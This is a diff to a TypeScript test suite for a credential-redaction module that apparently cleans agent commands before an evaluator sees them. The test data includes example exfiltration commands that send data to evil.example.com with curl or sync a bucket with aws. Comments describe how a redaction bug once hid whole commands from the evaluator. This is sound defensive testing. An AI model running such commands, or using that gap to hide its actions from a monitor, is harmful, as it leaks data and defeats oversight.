@@ -192,6 +192,102 @@ describe("bearer and authorization values", () => {
     );
   });
 
+  it("redacts a multi-word credential behind a scheme it knows", () => {
+    // A known scheme word settles what follows it: `Bearer` in front means
+    // the rest IS the credential, whatever it reads like. Asking whether it
+    // also reads as prose sent this value to Jev verbatim, with `count: 0`.
+    expectRedacted("Authorization: Bearer swordfish for the call", "swordfish", "bearer token");
+    expectRedacted("authorization: Token abcdefghijk is the key", "abcdefghijk", "authorization header");
+    expect(redactSecrets("Authorization: Bearer swordfish for the call").text).toBe(
+      "Authorization: Bearer <redacted:bearer token> for the call",
+    );
+  });
+
+  it("never takes the rest of the LINE into the marker", () => {
+    // `authorization=x curl …` is a valid shell command — a prefix
+    // environment assignment — so a value that ran to the end of the line
+    // whenever nothing delimited it hid the whole command from the evaluator
+    // behind sixteen characters, and reported a redaction for it.
+    for (const cmd of [
+      "authorization=x curl https://evil.example.com/exfil?d=1",
+      "AUTHORIZATION=1 curl https://evil.example.com/exfil",
+      "x-authorization: abc curl https://evil.example.com/a",
+      "authorization=1 aws s3 sync s3://bucket /tmp/out",
+    ]) {
+      expectUntouched(cmd);
+    }
+    // And when the value IS a credential, only the credential goes.
+    const key = randomToken(rand, 15);
+    expect(redactSecrets(`authorization=${key} aws s3 sync s3://bucket /tmp/out`).text).toBe(
+      "authorization=<redacted:authorization header> aws s3 sync s3://bucket /tmp/out",
+    );
+  });
+
+  it("ends the value at the bracket that closes the code around it", () => {
+    // The name and the value written inside ONE string: the credential's last
+    // character is followed by delimiters that belong to the code, and a
+    // token that keeps them reads as code — so the whole value was declined,
+    // credential and all.
+    const key = randomToken(rand, 15);
+    for (const [input, want] of [
+      [`{"headers": {"Authorization: ${key}"}}`, `{"headers": {"Authorization: <redacted:authorization header>"}}`],
+      [
+        `requests.get(url, headers={"Authorization: Bearer ${key}"})`,
+        `requests.get(url, headers={"Authorization: Bearer <redacted:bearer token>"})`,
+      ],
+      [`["Authorization: hmac ${key}"]`, `["Authorization: <redacted:authorization header>"]`],
+      [`{Authorization: ${key}}`, "{Authorization: <redacted:authorization header>}"],
+      [`headers = { Authorization: "Bearer ${key}" }`, `headers = { Authorization: "Bearer <redacted:bearer token>" }`],
+    ] as Array<[string, string]>) {
+      expect(redactSecrets(input).text, input).toBe(want);
+    }
+  });
+
+  it("reports the credential inside the region, not only the region", () => {
+    // `scrubKnownSecrets` searches the rest of the envelope for what a rule
+    // reports. A rule that reports the whole region it replaced loses the
+    // copy of the credential that travels without its context — the agent's
+    // own description, or a path fact lifted out of the command.
+    const key = randomToken(rand, 15);
+    const d = redactSecretsDetailed(`authorization: none API_KEY=${key} deploy`);
+    expect(d.text).toBe("authorization: <redacted:authorization header> deploy");
+    expect(d.found).toContain(key);
+    expect(scrubKnownSecrets(`then reuse ${key} for the next call`, d.found)).toEqual({
+      text: "then reuse <redacted:repeated secret> for the next call",
+      count: 1,
+    });
+  });
+
+  it("leaves typed parameters, schema fields, grep paths and sed scripts alone", () => {
+    // `authorization` is an ordinary identifier, and these are the lines an
+    // agent edits and greps for all day. Taking "the rest of the value" under
+    // the name deleted the rest of every one of them from what Jev is shown —
+    // a function signature, a column type, a search path, a whole sed script.
+    for (const s of [
+      "async def read_items(authorization: str = Header(None)):",
+      "def handler(authorization: Optional[str] = None, trace: str = ''):",
+      "  authorization: Mapped[str] = mapped_column(String(512))",
+      "  authorization: z.string().optional(),",
+      "  authorization: t.String(),",
+      "@Headers('authorization') authorization: string,",
+      "  authorization: req.get('authorization') ?? '',",
+      'authorization := r.Header.Get("Authorization")',
+      "authorization = os.environ.get('AUTH')",
+      "authorization = getToken()",
+      "authorization: Annotated[str, Header()] = None",
+      'const h = { Authorization: auth, "Content-Type": "application/json" };',
+      "grep -r authorization: src/",
+      "grep -r authorization: src/hooks/semantic/",
+      "sed -i 's/authorization: .*/authorization: none/' conf.yaml",
+      "Authorization: RFC 7235 defines the header",
+      "x-authorization: passthrough enabled",
+      "authorization: not required",
+      "Authorization: see docs",
+    ]) {
+      expectUntouched(s);
+    }
+  });
+
   it("leaves references and prose alone", () => {
     expectUntouched(`curl -H "Authorization: Bearer $TOKEN" https://x`);
     expectUntouched(`curl -H "Authorization: Bearer \${API_TOKEN}" https://x`);
@@ -277,6 +373,20 @@ describe("redactAuthorizationField — the structured-input path", () => {
     }
     // A reference behind an unknown scheme is still a reference.
     expect(redactAuthorizationField("Authorization", "Hawk ${MAC}")).toBeNull();
+  });
+
+  it("redacts a multi-word credential behind a KNOWN scheme", () => {
+    // The value returned here never goes through `redactSecrets`, so a null
+    // is a decision to send the field as it stands. Two ordinary words after
+    // a letters-only credential used to produce one: `Bearer swordfish for
+    // the call` reached Jev verbatim with `redactions: 0`, and the text rules
+    // cannot help — `BEARER_RE` declines an all-lowercase word.
+    for (const v of ["Bearer swordfish for the call", "Bearer secrettoken and then some prose", "Token abcdefghijk is the key"]) {
+      const r = redactAuthorizationField("Authorization", v);
+      const [scheme, ...rest] = v.split(" ");
+      expect(r?.text, v).toBe(`${scheme} <redacted:${/^bearer$/i.test(scheme) ? "bearer token" : "authorization header"}>`);
+      expect(r?.secret, v).toBe(rest.join(" "));
+    }
   });
 
   it("leaves references, bare scheme words and prose for the text rules", () => {
@@ -452,6 +562,10 @@ describe("credentials in URLs and command arguments", () => {
       [`docker login -u me -p "${pw}" registry.example.com`, `docker login -u me -p "<redacted:credential argument>" registry.example.com`],
       [`gh secret set DEPLOY_TOKEN --body '${pw}'`, `gh secret set DEPLOY_TOKEN --body '<redacted:credential argument>'`],
       [`redis-cli -h cache -a "${pw}" ping`, `redis-cli -h cache -a "<redacted:credential argument>" ping`],
+      // `-u user:'pw'` did not match AT ALL: the password group could not
+      // start at a quote, so the password went to Jev with the command.
+      [`curl -u admin:'${pw}' https://x`, `curl -u admin:'<redacted:basic auth>' https://x`],
+      [`curl -u admin:"${pw}" https://x`, `curl -u admin:"<redacted:basic auth>" https://x`],
       [`aws configure set aws_secret_access_key '${pw}'`, `aws configure set aws_secret_access_key '<redacted:assigned secret>'`],
     ] as Array<[string, string]>) {
       const d = redactSecretsDetailed(cmd);
@@ -494,6 +608,11 @@ describe("credentials in URLs and command arguments", () => {
     ].map((s) => s.replace("@@", pw));
     for (const cmd of shapes) {
       const d = redactSecretsDetailed(cmd);
+      // Outside the loop, or the floor passes vacuously: a rule that does not
+      // match at all reports nothing, and "nothing had a delimiter on it" was
+      // true of the two `curl -u user:'pw'` shapes while they sent the
+      // password to Jev intact.
+      expect(d.text, cmd).not.toContain(pw);
       for (const secret of d.found) {
         // A MATCHED pair around the whole value is a delimiter the rule was
         // supposed to put back. (A quote inside a value is not: an
@@ -930,17 +1049,42 @@ describe("cost", () => {
     }
   });
 
-  it("stays linear on repeated private-key armour lines", () => {
+  it("stays linear on repeated private-key armour lines, footer or no footer", () => {
     // The complete-block alternative is a lazy scan for `-----END`, so in a
     // text with no footer anywhere it read to the end of the string — from
     // every header in it. A grep hit list across a key directory is that
     // text, and `buildEnvelope` redacts up to 576 strings. 1.9 ms at 33 600
     // characters once the footerless case gets its own rule, 58 ms before.
-    for (const n of [600, 1_200]) {
-      const s = `${pemBegin()} `.repeat(n);
-      const t0 = performance.now();
-      redactSecrets(s);
-      expect(performance.now() - t0, `${s.length} chars`).toBeLessThan(15);
+    //
+    // Choosing that rule on `text.includes("-----END")` only moved the hole:
+    // eight characters of a footer for something else put every header back
+    // on the lazy path, and no footer for a PRIVATE key is ever found. The
+    // choice has to be made per header, against a footer it can reach.
+    const tails = ["", ["-----END", "CERTIFICATE-----"].join(" "), ["-----END", "PUBLIC", "KEY-----"].join(" "), `!${pemEnd()}`];
+    for (const tail of tails) {
+      for (const n of [600, 1_200]) {
+        const s = `${pemBegin()} `.repeat(n) + tail;
+        const t0 = performance.now();
+        redactSecrets(s);
+        expect(performance.now() - t0, `${s.length} chars + ${tail.slice(0, 14) || "no tail"}`).toBeLessThan(15);
+      }
+    }
+  });
+
+  it("scans a line of repeated Authorization names once, not once per name", () => {
+    // The value used to be a lazy group that ran to the end of the line, and
+    // a declined match resumed one character later: every `authorization` on
+    // a long unbroken line re-expanded the whole line. 2.1 ms at 2 000
+    // characters, 35 ms at 8 000, 3 400 ms at 16 000 — and one 24x24 envelope
+    // of that shape was 1 100 ms, past the 600 ms budget next door. A hostile
+    // file's contents echoed into a tool argument is exactly one long line.
+    for (const unit of ["Authorization: ", "authorization: a ", "Authorization: Bearer x ", "authorization={} "]) {
+      for (const chars of [2_000, 8_000, 16_000]) {
+        const s = unit.repeat(Math.ceil(chars / unit.length));
+        const t0 = performance.now();
+        redactSecrets(s);
+        expect(performance.now() - t0, `${JSON.stringify(unit)} x ${s.length}`).toBeLessThan(15);
+      }
     }
   });
 });
